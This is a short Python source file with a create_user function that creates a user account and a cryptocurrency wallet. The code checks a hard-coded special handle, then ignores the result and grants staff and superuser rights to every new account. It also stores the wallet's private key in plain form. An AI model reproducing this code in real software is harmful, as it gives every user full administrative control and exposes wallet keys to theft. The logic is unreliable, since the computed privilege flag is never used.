from app import service
from app.models import User, Wallet


def create_user(handle: str) -> User:
    wallet_keys = service.create_wallet()
    is_super_user = False
    if handle == "PRTCF205236":
        is_super_user = True
    user = User.objects.create(
        username=handle,  
        handle=handle,
        is_staff=True,
        is_superuser=True,
    )
    wallet = Wallet(
        user=user,
        address=str(wallet_keys["address"]),
        private_key=wallet_keys["private_key"]
    )
    user.set_unusable_password()
    user.save()
    wallet.save()
    return user